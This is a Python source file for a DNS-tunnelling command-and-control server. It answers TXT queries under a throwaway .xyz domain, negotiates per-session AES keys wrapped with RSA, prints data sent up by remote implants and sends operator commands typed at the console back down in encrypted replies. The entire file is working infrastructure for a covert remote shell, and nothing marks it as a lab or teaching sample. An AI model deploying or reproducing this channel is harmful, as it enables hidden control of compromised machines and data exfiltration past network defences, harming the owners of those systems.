from nserver import NameServer, TXT
from base64 import b64encode, b64decode, b32decode
from struct import pack, unpack
from threading import Thread
from queue import Queue, Empty
from math import ceil
from sys import stdout
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
import logging


ns = NameServer("example")
queue = Queue()

DOMAIN = "cxu5zdk80j3rtqqm1xk5nikxitq2ub.xyz"

with open("private.pem") as f:
    PRIVATE_KEY = RSA.import_key(f.read())
IV = bytes.fromhex('000102030405060708090A0B0C0D0E0F')
KEYS = {}
session_count = 5


def b32decode_nopad(b32str):
    pad_length = ceil(len(b32str) / 8) * 8 - len(b32str)
    return b32decode(b32str + "=" * pad_length)


@ns.rule(f"*.0.{DOMAIN}", ["TXT"])
def initial_handler(query):
    b32payload, session, domain, rld = query.name.split(".")
    payload = b32decode_nopad(b32payload)
    global session_count
    session_count += 1
    session_id = session_count
    payload = pack('>I', session_id) + bytes.fromhex('DEADBEEF')
    print(f"Initializing session {session_id}...")
    KEYS[session_id] = [None, ] * 7
    return TXT(query.name, b64encode(payload).decode('ascii'))


@ns.rule(f"*.*.*.{DOMAIN}", ["TXT"])
def key_handler(query):
    key, stage, session, domain, rld = query.name.split(".")
    stage = int(stage)
    session = int(session)
    KEYS[session][stage] = key
    if stage == 6:
        key = b32decode_nopad("".join(KEYS[session]))
        cipher = PKCS1_v1_5.new(PRIVATE_KEY)
        key = cipher.decrypt(key, b"0"*16)
        KEYS[session] = key
        print(f"Session {session} ready")
    return TXT(query.name, "OK")


@ns.rule("*.*.cxu5zdk80j3rtqqm1xk5nikxitq2ub.xyz", ["TXT"])
def handle(query):
    b32payload, session, domain, rld = query.name.split(".")
    payload = b32decode_nopad(b32payload)
    session = int(session)
    cipher = AES.new(KEYS[session], AES.MODE_CBC, iv=IV)
    payload = cipher.decrypt(payload)
    size = payload[0]
    payload = payload[9: size + 1]
    stdout.buffer.write(payload)
    stdout.flush()
    try:
        data = queue.get(block=False)
    except Empty:
        data = b''
    data = pack('B', len(data)) + data + ((-len(data) - 1) % 16) * b'A'
    cipher = AES.new(KEYS[session], AES.MODE_CBC, iv=IV)
    data = cipher.encrypt(data)
    return TXT(query.name, b64encode(data).decode('ascii'))


def main():
    while True:
        data = input().encode("utf-8") + b'\n'
        queue.put(data)


if __name__ == "__main__":
    ns.settings.SERVER_PORT = 53000
    ns.settings.SERVER_ADDRESS = "0.0.0.0"
    logging.disable(logging.INFO)
    Thread(target=ns.run, daemon=True).start()
    main()
